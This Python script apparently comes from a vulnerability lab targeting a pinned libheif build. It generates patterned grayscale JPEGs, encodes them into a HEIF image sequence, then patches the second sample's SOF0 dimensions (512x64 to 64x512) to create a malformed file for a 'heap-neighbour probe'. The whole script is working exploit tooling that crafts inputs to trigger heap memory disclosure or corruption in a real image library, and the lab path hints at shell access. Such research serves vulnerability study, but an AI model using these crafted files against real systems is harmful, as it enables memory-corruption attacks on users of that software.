#!/usr/bin/env python3
"""Rebuild the patterned MJPEG sequence used by the heap-neighbour probe.

Usage: make_pattern_sequence.py HEIF_ENC OUTDIR
HEIF_ENC is the pinned v1.23.6 build's examples/heif-enc (plain build in this
lab: /tmp/libheif2shell-vuln-plain/examples/heif-enc). Writes pat_1.jpg,
pat_2.jpg, pattern-reference.heif and pattern-mixed.heif into OUTDIR.

The two 512x64 grayscale JPEGs have a distinct constant value per 8x8 block,
so the decoded frame-1 plane carries position-dependent, file-derived bytes.
Only the second sample's SOF0 height/width is patched (512x64 -> 64x512);
the entropy-coded sample bytes are unchanged.
"""
import struct
import subprocess
import sys
from pathlib import Path
from PIL import Image


def make_jpegs(out: Path) -> None:
    for idx, bias in enumerate((0, 40), 1):
        im = Image.new("L", (512, 64))
        px = im.load()
        for y in range(64):
            for x in range(512):
                bx, by = x // 8, y // 8
                px[x, y] = 20 + ((bx * 13 + by * 7 + bias) % 180)
        im.save(out / f"pat_{idx}.jpg", "JPEG", quality=95, subsampling=0)


def patch_second_sof(ref: Path, out: Path, new_h: int, new_w: int) -> None:
    data = bytearray(ref.read_bytes())
    boxes = []
    offset = 0
    while offset + 8 <= len(data):
        size, kind = struct.unpack_from(">I4s", data, offset)
        if size < 8 or offset + size > len(data):
            raise SystemExit(f"bad box at {offset}: size={size} kind={kind!r}")
        boxes.append((offset, size, kind))
        offset += size
    mdats = [(o, n) for o, n, k in boxes if k == b"mdat"]
    mdat_start, mdat_size = mdats[-1]
    payload = mdat_start + 8
    assert (mdat_size - 8) % 2 == 0
    sample = (mdat_size - 8) // 2
    second = payload + sample
    sof = data.find(b"\xff\xc0", second, payload + 2 * sample)
    if sof < 0:
        raise SystemExit("no SOF0 marker in second sample")
    h, w = struct.unpack_from(">HH", data, sof + 5)
    print(f"SOF0 at {sof}: {w}x{h} -> {new_w}x{new_h}; sample={sample}")
    struct.pack_into(">HH", data, sof + 5, new_h, new_w)
    out.write_bytes(data)


def main() -> None:
    heif_enc, outdir = sys.argv[1:3]
    out = Path(outdir)
    out.mkdir(parents=True, exist_ok=True)
    make_jpegs(out)
    subprocess.run([heif_enc, "-S", "--jpeg", str(out / "pat_1.jpg"),
                    str(out / "pat_2.jpg"), "-o", str(out / "pattern-reference.heif")],
                   check=True)
    patch_second_sof(out / "pattern-reference.heif", out / "pattern-mixed.heif",
                     512, 64)
    for name in ("pat_1.jpg", "pat_2.jpg", "pattern-reference.heif", "pattern-mixed.heif"):
        print(name, (out / name).stat().st_size)


if __name__ == "__main__":
    main()
